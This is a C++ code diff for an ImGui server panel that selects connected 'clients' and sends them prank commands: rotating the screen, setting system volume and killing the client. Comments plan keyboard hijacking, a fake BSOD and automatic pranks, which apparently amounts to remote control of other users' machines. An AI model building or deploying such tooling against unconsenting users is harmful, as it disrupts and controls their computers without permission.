@@ -150,7 +150,7 @@ public:
 
 
     void check_if_client_alive() {
-        //while (true) {
+        while (true) {
             std::map<int, std::unique_ptr<Client>> still_alive;
     
             {
@@ -175,7 +175,7 @@ public:
                 selected_client = -1;
             }
             std::this_thread::sleep_for(std::chrono::seconds(1));
-        // }
+        }
     }
 
     std::vector<int> get_connected_clients() {
@@ -329,6 +329,7 @@ int main() {
     int mouse_x = 0,mouse_y = 0;
     int size_x = 100,size_y = 100;
     
+    int selected_button = 0;
     GLuint texture_id = create_texture();
     while (!glfwWindowShouldClose(window)) {
         glfwPollEvents();
@@ -417,7 +418,7 @@ int main() {
 
         ImGui::Begin("Keyboard");
         /*
-            d send message to be typed by the user's keyboard
+            - send message to be typed by the user's keyboard
             - echo keyboard (repeats what was typed after a few seconds)
             - make it so keyboard presses become a random key (t)
         */
@@ -428,12 +429,51 @@ int main() {
 
         ImGui::Begin("Visual & Sound");
         /*
-            - flip screen (0, 90, 180, 270)
-            - set system volume
+            d flip screen (0, 90, 180, 270)
+            d set system volume
             - fake BSOD 
-            - screen tint (send a color to recolor the screen)
-            - play a sound
         */
+
+            ImVec4 selected_color = ImVec4(0.2f, 0.6f, 0.9f, 1.0f);
+            ImVec4 normal_color = ImVec4(0.2f, 0.2f, 0.2f, 1.0f); 
+
+            for (int i = 0; i <= 270; i += 90) {
+                if (selected_button == i) {
+                    ImGui::PushStyleColor(ImGuiCol_Button, selected_color);
+                    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, selected_color);
+                    ImGui::PushStyleColor(ImGuiCol_ButtonActive, selected_color);
+                } else {
+                    ImGui::PushStyleColor(ImGuiCol_Button, normal_color);
+                    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, normal_color);
+                    ImGui::PushStyleColor(ImGuiCol_ButtonActive, normal_color);
+                }
+
+                if (ImGui::RadioButton(std::to_string(i).c_str(), selected_button == i)) {
+                    selected_button = i;  
+                }
+
+                ImGui::PopStyleColor(3); 
+            }
+
+            if (ImGui::Button("Send rotation")) {
+                Packet packet23{};
+                packet23.id = packet_id::ROTATE_SCREEN;
+                packet23.number = selected_button;
+
+                server.send_to_client(packet23);
+            }
+            
+            static int volume;
+            ImGui::SliderInt("Volume", &volume, 0, 100);
+
+            if(ImGui::Button("Send Volume")) {
+                Packet a_the_betst_backet{};
+                a_the_betst_backet.id = packet_id::SYSTEM_SOUND;
+                a_the_betst_backet.number = volume;
+
+                server.send_to_client(a_the_betst_backet);
+            }
+            
         ImGui::End();
 
 
@@ -441,6 +481,7 @@ int main() {
         /*
             - Start/Stop all button
             d A target selector
+            d Add a kill button
             - A auto mode which does pranks automatically
             - A log of pranks ran
             - Add a prank schedual
@@ -451,18 +492,28 @@ int main() {
                 std::string label = "Client: " + std::to_string(id);
                 bool is_selected = (server.selected_client == id);
             
-                if (is_selected)
+                if (is_selected) {
                     ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.2f, 0.6f, 0.9f, 1.0f));
-            
+                }
                 if (ImGui::Button(label.c_str())) {
                     std::cout << "Selected client: " << id << "\n";
                     server.selected_client = id;
                 }
             
                 if (is_selected)
-                    ImGui::PopStyleColor();  // only pop if push happened
+                    ImGui::PopStyleColor();  
+                if(is_selected) {
+                    ImGui::SameLine();
+                    if(ImGui::Button("Kill")) {
+                        Packet kill_packet{};
+
+                        kill_packet.id = packet_id::KILL;
+                        server.send_to_client(kill_packet);
+                    }
+                }
+            
             }
-            ImGui::NewLine();  // wrap after all client buttons
+            ImGui::NewLine();  
         ImGui::End();
 
         ImGui::Begin("customize");
